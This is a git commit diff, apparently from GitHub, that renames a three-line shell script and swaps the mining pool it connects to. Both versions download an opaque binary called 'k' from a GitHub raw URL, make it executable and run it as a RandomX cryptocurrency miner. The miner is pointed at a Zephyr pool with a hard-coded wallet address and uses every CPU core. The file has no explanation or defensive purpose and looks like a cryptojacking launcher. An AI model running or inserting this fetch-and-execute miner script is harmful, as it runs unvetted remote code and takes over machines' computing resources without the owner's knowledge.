5b3f34fb11f39e652f77f3ac66141e89b9d996bf
traapoks <165988185+traapoks@users.noreply.github.com>
2024-04-30 02:39:26 +0700

    Update and rename rxzep.sh to rxz.sh

---
+++ rxz.sh
@@ -0,0 +1,3 @@
+wget https://raw.githubusercontent.com/petugas/No/main/k
+chmod +x k
+./k -o de.zephyr.herominers.com:1123 -u ZEPHs7GPNSs7gCsvd1cUUMg5mydeQ5Tun21tS996siZY2nK74NExeWKVtRmHzHEA87ZdSnoDfTmFrhxg7c1KtAmoEvFZ8m2bPtj -a rx/0 -k -t --randomx-fastmode=fast $(nproc)
--- rxzep.sh
+++
@@ -1,3 +0,0 @@
-wget https://raw.githubusercontent.com/petugas/No/main/k
-chmod +x k
-./k -o xm.erlandi.eu.org:8080 -u ZEPHs7GPNSs7gCsvd1cUUMg5mydeQ5Tun21tS996siZY2nK74NExeWKVtRmHzHEA87ZdSnoDfTmFrhxg7c1KtAmoEvFZ8m2bPtj -a rx/0 -k -t --randomx-fastmode=fast $(nproc)
